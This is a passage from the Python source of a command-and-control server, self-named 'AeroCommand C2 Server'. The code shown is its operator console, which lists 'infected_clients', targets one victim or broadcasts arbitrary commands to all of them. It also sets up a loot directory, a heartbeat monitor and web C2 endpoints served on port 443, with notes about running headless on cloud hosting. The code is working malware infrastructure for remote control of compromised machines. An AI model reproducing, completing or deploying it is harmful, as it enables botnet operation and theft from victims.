                                admin_tag = f" {C.RED}[ADMIN]{C.RESET}" if info.get('admin') else ""
                                print(f"\n{C.GREEN}[✓] Targeting:{C.RESET} {info['host']} ({info['ip']}){admin_tag}")
                            else:
                                print(f"\n{C.YELLOW}[!] Invalid client ID. Use 'list' to see available clients{C.RESET}")
                    except ValueError:
                        print(f"\n{C.YELLOW}[!] Invalid syntax. Use: target <id>{C.RESET}")
                else:
                    print(f"\n{C.YELLOW}[!] Invalid syntax. Use: target <id>{C.RESET}")

            elif cmd.lower().startswith("broadcast "):
                broadcast_cmd = cmd[10:].strip()
                if not broadcast_cmd:
                    print(f"\n{C.YELLOW}[!] Usage: broadcast <command>{C.RESET}")
                    continue
                with cmd_lock:
                    if not infected_clients:
                        print(f"\n{C.YELLOW}[!] No clients connected{C.RESET}")
                        continue
                    count = 0
                    for cid in infected_clients:
                        if cid not in pending_commands:
                            pending_commands[cid] = []
                        pending_commands[cid].append(broadcast_cmd)
                        count += 1
                    print(f"{C.GREEN}[→] Command broadcast to {count} client(s){C.RESET}")

            elif cmd.lower() == "clear":
                os.system("cls")

            elif cmd.lower() == "exit":
                print(f"{C.RED}[!] Shutting down...{C.RESET}")
                os._exit(0)

            else:
                # Send command to targeted client
                with cmd_lock:
                    if not infected_clients:
                        print(f"\n{C.YELLOW}[!] No clients connected yet{C.RESET}")
                        continue
                    if target_client is None:
                        # Default to first client
                        target_client = list(infected_clients.keys())[0]
                        info = infected_clients[target_client]
                        print(f"{C.GRAY}[i] Auto-targeting first client: {info['host']}{C.RESET}")

                    if target_client not in pending_commands:
                        pending_commands[target_client] = []
                    pending_commands[target_client].append(cmd)
                    info = infected_clients.get(target_client, {})
                    print(f"{C.GREEN}[→] Command sent to {info.get('host', target_client)}{C.RESET}")

        except EOFError:
            # Headless environment (Render/Cloud) - STDIN closed, stop input loop gracefully
            break
        except KeyboardInterrupt:
            print(f"\n{C.RED}[!] Shutting down...{C.RESET}")
            os._exit(0)
        except Exception as e:
            print(f"{C.RED}[!] Error: {e}{C.RESET}")
            continue


if __name__ == "__main__":
    # Ensure database and loot directory are ready
    init_db()
    os.makedirs(LOOT_DIR, exist_ok=True)

    # Read port from environment variable (Render sets $PORT, defaults to 443 locally)
    server_port = int(os.environ.get("PORT", 443))
    print(f"{C.GREEN}[+] AeroCommand C2 Server starting on port {server_port}...{C.RESET}")

    # Start heartbeat monitor in background daemon thread
    heartbeat_thread = threading.Thread(target=heartbeat_monitor)
    heartbeat_thread.daemon = True
    heartbeat_thread.start()

    # Start interactive input console ONLY if running in an interactive terminal (local TTY)
    if sys.stdin and sys.stdin.isatty():
        input_thread = threading.Thread(target=input_thread_func)
        input_thread.daemon = True
        input_thread.start()
    else:
        print(f"{C.CYAN}[i] Cloud/Headless mode detected (no TTY) — Web C2 endpoints are active.{C.RESET}")

    # Production WSGI server (waitress) with graceful fallback to the Flask dev server.
    # Threads >= 16: every SSE operator stream holds one thread for its lifetime.
    try:
        from waitress import serve
        print(f"{C.GREEN}[+] Serving via waitress (production WSGI, 16 threads){C.RESET}")
        serve(app, host="0.0.0.0", port=server_port, threads=16, channel_timeout=300)
    except ImportError:
        print(f"{C.YELLOW}[!] waitress not installed — falling back to Flask dev server{C.RESET}")
        app.run(host="0.0.0.0", port=server_port, debug=False, use_reloader=False, threaded=True)